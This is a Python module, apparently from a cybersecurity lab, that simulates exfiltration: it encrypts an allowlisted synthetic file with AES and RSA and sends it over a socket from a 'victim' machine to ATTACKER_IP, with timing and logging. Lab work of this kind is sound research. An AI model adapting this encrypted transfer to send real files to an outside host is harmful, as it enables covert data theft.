"""Send one allowlisted synthetic file from the Ubuntu victim to Kali.

Run from the victim repository root:
    python3 -m victim.transfer_sender 01_Operations/report.pdf
"""

import argparse
import hashlib
import json
import socket
import time
from datetime import datetime, timezone
from pathlib import Path

from config import ATTACKER_IP, LOG_DIR, RSA_PUB_KEY_PATH, TEST_DATA_DIR, TRANSFER_PORT
from shared.crypto import aes_encrypt, generate_aes_key, generate_iv, rsa_wrap_key
from shared.transfer_protocol import FILE_CHOICES, MAX_CIPHERTEXT, header, tag


def _measure(name, function, records):
    ts = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
    started = time.perf_counter_ns()
    result = function()
    records.append({"ts": ts, "operation": name,
                    "duration_ms": round((time.perf_counter_ns() - started) / 1e6, 6)})
    return result


def send_file(relative):
    if relative not in FILE_CHOICES:
        raise ValueError("File is not an approved synthetic sample")
    root = Path(TEST_DATA_DIR)
    if root.is_symlink():
        raise ValueError("Dataset root is a symlink")
    path = root / relative
    if path.is_symlink() or not path.is_file() or not path.resolve().is_relative_to(root.resolve()):
        raise ValueError("Unsafe or missing dataset file")
    plaintext = path.read_bytes()
    if len(plaintext) > MAX_CIPHERTEXT - 16:
        raise ValueError("File exceeds lab transfer limit")
    operations = []
    digest = _measure("hash_plaintext", lambda: hashlib.sha256(plaintext).hexdigest(), operations)
    key, iv = generate_aes_key(), generate_iv()
    ciphertext = _measure("encrypt", lambda: aes_encrypt(plaintext, iv, key), operations)
    ciphertext_sha256 = _measure("hash_ciphertext", lambda: hashlib.sha256(ciphertext).hexdigest(), operations)
    wrapped = _measure("wrap_key", lambda: rsa_wrap_key(key, RSA_PUB_KEY_PATH), operations)
    payload = header(relative, len(ciphertext), iv, wrapped) + ciphertext
    packet = payload + _measure("authenticate_payload", lambda: tag(key, payload), operations)
    started = time.perf_counter()
    with socket.create_connection((ATTACKER_IP, TRANSFER_PORT), timeout=10) as connection:
        connection.settimeout(15)
        connection.sendall(packet)
        connection.shutdown(socket.SHUT_WR)
        response = connection.recv(64)
    if response != b"OK\n":
        raise RuntimeError("Receiver did not confirm an intact file")
    elapsed = round(time.perf_counter() - started, 4)
    record = {"ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
              "module": "transfer", "event": "file_sent", "file": relative,
              "bytes": len(plaintext), "sha256": digest, "ciphertext_sha256": ciphertext_sha256,
              "operations": operations,
              "elapsed_s": elapsed, "dst_ip": ATTACKER_IP, "dst_port": TRANSFER_PORT}
    log_dir = Path(LOG_DIR)
    if log_dir.resolve(strict=False).is_relative_to(root.resolve()):
        raise ValueError("Log directory must be outside dataset")
    log_dir.mkdir(parents=True, exist_ok=True)
    with (log_dir / "transfer.log").open("a", encoding="utf-8") as stream:
        stream.write(json.dumps(record, sort_keys=True) + "\n")
    print(f"PASS: transferred {relative} ({len(plaintext)} bytes) in {elapsed}s")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("file", choices=FILE_CHOICES)
    args = parser.parse_args()
    send_file(args.file)


if __name__ == "__main__":
    main()